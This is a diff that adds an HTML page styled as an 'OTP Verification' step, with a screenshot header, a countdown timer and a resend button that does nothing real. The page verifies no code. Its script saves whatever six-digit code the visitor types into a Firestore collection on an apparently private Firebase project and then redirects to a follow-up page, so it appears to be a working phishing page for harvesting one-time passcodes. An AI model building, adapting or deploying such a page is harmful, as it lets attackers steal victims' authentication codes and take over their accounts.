@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OTP Verification</title>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #f5f9ff;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 0 0 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      overflow: hidden;
+      text-align: center;
+    }
+
+    .header-image {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+    }
+
+    h2 {
+      margin: 20px 0;
+      color: #1a237e;
+    }
+
+    input[type="text"] {
+      width: 80%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    .timer-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .timer,
+    .attempt {
+      font-size: 14px;
+      color: #d32f2f;
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: #1a73e8;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: underline;
+      margin-bottom: 20px;
+    }
+
+    .resend-btn:disabled {
+      color: gray;
+      text-decoration: none;
+      cursor: default;
+    }
+
+    .submit-btn {
+      width: 80%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background-color: #155ab6;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Header Image -->
+  <img class="header-image" src="https://i.ibb.co/mVb8TD1Q/Screenshot-2025-06-10-13-46-29-59-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Header Image" />
+
+  <h2>OTP Verification</h2>
+
+  <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6" />
+
+  <div class="timer-row">
+    <div class="timer" id="countdown">03:00</div>
+    <div class="attempt">OTP Attempt 1</div>
+  </div>
+
+  <button class="resend-btn" id="resendBtn" disabled>Resend OTP</button><br>
+
+  <button class="submit-btn" onclick="submitOTP()">Submit</button>
+</div>
+
+<script>
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyDih7qIaS1eX68IIsDmAKXxYPtqvo9jLc0",
+    authDomain: "amit-f5b5b.firebaseapp.com",
+    projectId: "amit-f5b5b",
+    storageBucket: "amit-f5b5b.appspot.com",
+    messagingSenderId: "282917580402",
+    appId: "1:282917580402:web:2a97eea5254d59dedb1ceb"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // Submit OTP
+  function submitOTP() {
+    const otp = document.getElementById("otpInput").value.trim();
+
+    if (otp.length !== 6 || isNaN(otp)) {
+      alert("Please enter a valid 6-digit OTP.");
+      return;
+    }
+
+    db.collection("alldata-hare").add({
+      type: "OTP",
+      otp: otp,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    }).then(() => {
+      
+      window.location.href = "attempt.html2";
+    }).catch((error) => {
+      alert("Error submitting OTP.");
+      console.error(error);
+    });
+  }
+
+  // Countdown logic
+  const countdownEl = document.getElementById("countdown");
+  const resendBtn = document.getElementById("resendBtn");
+  let timeLeft = 180;
+  let timer;
+
+  function updateTimerDisplay() {
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    countdownEl.textContent =
+      `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+  }
+
+  function startTimer() {
+    timeLeft = 180;
+    resendBtn.disabled = true;
+    updateTimerDisplay();
+
+    timer = setInterval(() => {
+      timeLeft--;
+      updateTimerDisplay();
+
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        resendBtn.disabled = false;
+        countdownEl.textContent = "OTP expired";
+      }
+    }, 1000);
+  }
+
+  resendBtn.addEventListener("click", () => {
+    clearInterval(timer);
+    startTimer();
+    alert("OTP resent");
+  });
+
+  // Start timer on load
+  startTimer();
+</script>
+
+</body>
+</html>
